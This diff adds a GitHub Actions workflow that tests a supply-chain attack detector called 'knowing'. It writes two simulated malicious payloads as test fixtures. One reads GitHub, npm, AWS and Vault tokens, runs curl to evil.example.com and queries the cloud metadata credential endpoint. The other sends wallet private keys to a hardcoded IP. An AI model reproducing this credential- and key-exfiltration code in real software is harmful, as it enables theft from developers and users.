@@ -1,0 +1,159 @@
+name: "Supply Chain Detection Demos"
+
+on:
+  push:
+    paths:
+      - 'demos/supply-chain-attacks/**'
+      - 'internal/indexer/**/env_edges*.go'
+      - 'internal/indexer/**/process_edges*.go'
+      - 'internal/indexer/tsextractor/endpoint_edges.go'
+      - 'internal/diff/isolation*.go'
+      - 'cmd/knowing/audit_supply_chain*.go'
+  workflow_dispatch:
+
+jobs:
+  tanstack-demo:
+    name: "Demo: TanStack pattern detection"
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.25'
+
+      - name: Build knowing
+        run: GOWORK=off go build -o knowing ./cmd/knowing
+
+      - name: Create TanStack-pattern test payload
+        run: |
+          mkdir -p /tmp/tanstack-test/src
+          cat > /tmp/tanstack-test/src/malicious.ts << 'PAYLOAD'
+          import { spawn } from 'child_process';
+
+          async function exfiltrate() {
+            const token = process.env.GITHUB_TOKEN;
+            const npmToken = process.env.NPM_TOKEN;
+            const awsKey = process.env["AWS_ACCESS_KEY_ID"];
+            const vaultToken = process.env.VAULT_TOKEN;
+
+            const child = spawn('curl', ['-X', 'POST', 'https://evil.example.com/steal']);
+            child.unref();
+
+            await fetch('https://api.github.com/user', {
+              headers: { Authorization: \`token \${token}\` }
+            });
+            await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+          }
+          exfiltrate();
+          PAYLOAD
+          cat > /tmp/tanstack-test/package.json << 'PKG'
+          {"name": "tanstack-pattern-test", "version": "1.0.0"}
+          PKG
+          (cd /tmp/tanstack-test && git init && git add . && git commit -m "init" -q)
+
+      - name: Index and detect
+        run: |
+          ./knowing index -db /tmp/test.db -no-enrich /tmp/tanstack-test
+          echo ""
+          echo "=== DETECTION RESULTS ==="
+          sqlite3 /tmp/test.db "
+            SELECT
+              s.qualified_name AS source,
+              e.edge_type,
+              t.qualified_name AS target
+            FROM edges e
+            JOIN nodes s ON e.source_hash = s.node_hash
+            JOIN nodes t ON e.target_hash = t.node_hash
+            WHERE e.edge_type IN ('reads_env', 'executes_process', 'consumes_endpoint')
+            ORDER BY e.edge_type, t.qualified_name
+          "
+
+      - name: Verify detection signals
+        run: |
+          # Must detect all expected signals
+          READS_ENV=$(sqlite3 /tmp/test.db "SELECT COUNT(*) FROM edges WHERE edge_type='reads_env'")
+          EXEC_PROC=$(sqlite3 /tmp/test.db "SELECT COUNT(*) FROM edges WHERE edge_type='executes_process'")
+          ENDPOINTS=$(sqlite3 /tmp/test.db "SELECT COUNT(*) FROM edges WHERE edge_type='consumes_endpoint'")
+
+          echo "reads_env edges: $READS_ENV"
+          echo "executes_process edges: $EXEC_PROC"
+          echo "consumes_endpoint edges: $ENDPOINTS"
+
+          [ "$READS_ENV" -ge 4 ] || { echo "FAIL: expected >= 4 reads_env edges"; exit 1; }
+          [ "$EXEC_PROC" -ge 1 ] || { echo "FAIL: expected >= 1 executes_process edge"; exit 1; }
+          [ "$ENDPOINTS" -ge 1 ] || { echo "FAIL: expected >= 1 consumes_endpoint edge"; exit 1; }
+
+          echo "PASS: All TanStack-pattern signals detected"
+
+  event-stream-demo:
+    name: "Demo: event-stream pattern detection"
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.25'
+
+      - name: Build knowing
+        run: GOWORK=off go build -o knowing ./cmd/knowing
+
+      - name: Create event-stream-pattern test payload
+        run: |
+          mkdir -p /tmp/es-test/src
+          cat > /tmp/es-test/src/payload.js << 'PAYLOAD'
+          var http = require('https');
+          var crypto = require('crypto');
+
+          function processPayment(wallet) {
+            var key = crypto.createDecipher('aes256', getKey());
+            var data = wallet.getPrivateKeys();
+
+            var req = http.request({
+              hostname: '111.90.151.35',
+              port: 8080,
+              path: '/p',
+              method: 'POST'
+            });
+            req.write(JSON.stringify({ keys: data }));
+            req.end();
+          }
+
+          function getKey() {
+            try { return require('copay-dash/package.json').description; }
+            catch(e) { return null; }
+          }
+
+          try { processPayment(require('copay-dash')); } catch(e) {}
+          PAYLOAD
+          cat > /tmp/es-test/package.json << 'PKG'
+          {"name": "event-stream-pattern-test", "version": "1.0.0"}
+          PKG
+          (cd /tmp/es-test && git init && git add . && git commit -m "init" -q)
+
+      - name: Index and detect
+        run: |
+          ./knowing index -db /tmp/test.db -no-enrich /tmp/es-test
+          echo ""
+          echo "=== DETECTION RESULTS ==="
+          sqlite3 /tmp/test.db "
+            SELECT
+              s.qualified_name AS source,
+              e.edge_type,
+              t.qualified_name AS target
+            FROM edges e
+            JOIN nodes s ON e.source_hash = s.node_hash
+            JOIN nodes t ON e.target_hash = t.node_hash
+            WHERE e.edge_type IN ('reads_env', 'executes_process', 'consumes_endpoint')
+            ORDER BY e.edge_type, t.qualified_name
+          "
+
+      - name: Verify detection signals
+        run: |
+          ENDPOINTS=$(sqlite3 /tmp/test.db "SELECT COUNT(*) FROM edges WHERE edge_type='consumes_endpoint'")
+          echo "consumes_endpoint edges: $ENDPOINTS"
+
+          [ "$ENDPOINTS" -ge 1 ] || { echo "FAIL: expected >= 1 consumes_endpoint edge (http.request hostname pattern)"; exit 1; }
+
+          echo "PASS: event-stream exfiltration endpoint detected"
